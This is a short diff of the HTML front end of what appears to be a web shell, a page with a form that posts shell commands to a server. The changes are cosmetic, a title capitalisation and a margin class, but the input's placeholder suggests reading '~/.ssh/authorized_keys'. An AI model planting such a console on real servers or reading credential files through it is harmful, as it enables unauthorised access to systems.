@@ -240,7 +240,7 @@
           content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="charset" content="UTF-8">
-    <title>Webshell</title>
+    <title>WebShell</title>
 
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"/>
@@ -329,7 +329,7 @@
                         </tbody>
                     </table>
 
-                    <form class="console d-flex pt-1 rounded-top" action="" method="post">
+                    <form class="console d-flex pt-1 mt-1 rounded-top" action="" method="post">
                         <label for="command">$</label>
                         <input id="command" type="text" name="command" onkeyup="inputKeyUp(event)" autofocus placeholder="cat ~/.ssh/authorized_keys">
                     </form>
